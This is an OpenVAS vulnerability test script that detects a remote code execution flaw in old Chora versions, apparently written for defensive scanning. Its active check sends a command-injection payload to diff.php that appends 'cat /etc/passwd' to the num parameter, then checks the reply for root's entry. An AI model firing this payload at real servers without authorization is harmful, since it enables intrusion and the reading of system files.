# OpenVAS Vulnerability Test
# $Id: chora_remote_code_execution.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Chora Remote Code Execution Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote server is running at least one instance of Chora version
1.2.1 or earlier.  Such versions have a flaw in the diff viewer that
enables a remote attacker to run arbitrary code with the permissions of
the web user.";

tag_solution = "Upgrade to Chora version 1.2.2 or later.";

if (description) {
  script_oid("1.3.6.1.4.1.25623.1.0.12281");
  script_version("$Revision: 9348 $");
  script_bugtraq_id(10531);
  script_xref(name:"GLSA", value:"GLSA 200406-09");
  script_xref(name:"OSVDB", value:"7005");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  name = "Chora Remote Code Execution Vulnerability";
  script_name(name);

 
  summary = "Checks for remote code execution vulnerability in Chora";
 
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_active");
  script_copyright("This script is Copyright (C) 2004 George A. Theall");

  family = "Web application abuses";
  script_family(family);

  script_dependencies("chora_detect.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);

  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://security.e-matters.de/advisories/102004.html");
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

host = get_host_name();
port = get_http_port(default:80);
if (debug_level) display("debug: checking for Chora remote code execution on ", host, ":", port, ".\n");

if (!get_port_state(port)) exit(0);

# This function finds a file in CVS, recursing directories if necessary.
# Args:
#   - basedir is the web path to cvs.php
#   - cvsdir is the CVS directory to look in.
# Return:
#   - filename of the first file it finds in CVS or an empty 
#     string if none can be located.
function find_cvsfile(basedir, cvsdir) {
  local_var url, req, res, pat, matches, m, files, dirs;

  url = string(basedir, "/cvs.php", cvsdir);
  if (debug_level) display("debug: getting =>>", url, "<<\n");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) return "";           # can't connect

  if (egrep(string:res, pattern:"^HTTP/.* 200 OK")) {
    # Identify files.
    pat = "/co\.php/.*(/.+)\?r=";
    matches = egrep(string:res, pattern:pat);
    if (!isnull(matches)) {
      foreach m (split(matches)) {
        files = eregmatch(string:m, pattern:pat);
        if (!isnull(files)) {
          # Return the first file we find.
          if (debug_level) display("debug: file =>>", cvsdir, files[1], "<<\n");
          return(string(cvsdir, files[1]));
        }
      }
    }

    # Identify directories and recurse into each until we find a file.
    pat = "folder\.gif[^>]+>&nbsp;([^<]+)/</a>";
    matches = egrep(string:res, pattern:pat);
    if (!isnull(matches)) {
      foreach m (split(matches)) {
        dirs = eregmatch(string:m, pattern:pat);
        if (!isnull(dirs)) {
          file = find_cvsfile(basedir:basedir, cvsdir:string(cvsdir, "/", dirs[1]));
          if (debug_level) display("file=>>", file, "<<\n");
          if (!isnull(file)) return(file);
        }
      }
    }
  }
}

# Check each installed instance, stopping if we find a vulnerability.
entries = get_kb_list(string("www/", port, "/chora"));
if (isnull(entries)) exit(0);
foreach entry (entries) {
  matches = eregmatch(string:entry, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];
    if (debug_level) display("debug: checking for remote code execution vulnerability in Chora ", ver, " under ", dir, ".\n");

    # If safe_checks is enabled, rely on the version number alone.
    if (safe_checks()) {
      if (ereg(pattern:"^(0\.|1\.(0\.|1\.|2|2\.1))(-(cvs|ALPHA))$", string:ver)) {
        security_message(port);
        exit(0);
      }
    }
    # Else, try an exploit.
    else {
      file = find_cvsfile(basedir:dir, cvsdir:"");
      if (!isnull(file)) {
        # nb: I'm not sure 1.1 will always be available; it might
        #     be better to pull revision numbers from chora.
        rev = "1.1";
        url = string(
          dir, "/diff.php", file, 
          "?r1=", rev, 
          "&r2=", rev,
          # nb: setting the type to "context" lets us see the output
          "&ty=c",
          #     and for a PoC we'll grab /etc/passwd.
          "&num=3;cat%20/etc/passwd;"
        );
        if (debug_level) display("debug: getting =>>", url, "<<\n");
        req = http_get(item:url, port:port);
        res = http_keepalive_send_recv(port:port, data:req);
        if (res == NULL) exit(0);           # can't connect
        if (debug_level) display("debug: res =>>", res, "<<\n");

        # Trouble if there's a line like root's passwd entry in the results.
        if (egrep(string:res, pattern:"root:.+:0:")) {
          security_message(port);
          exit(0);
        }
      }
      else {
        if (debug_level) display("Could not determine whether Chora on ", host, ":", port, " is vulnerable to remote code execution!\n");
      }
    }
  }
}
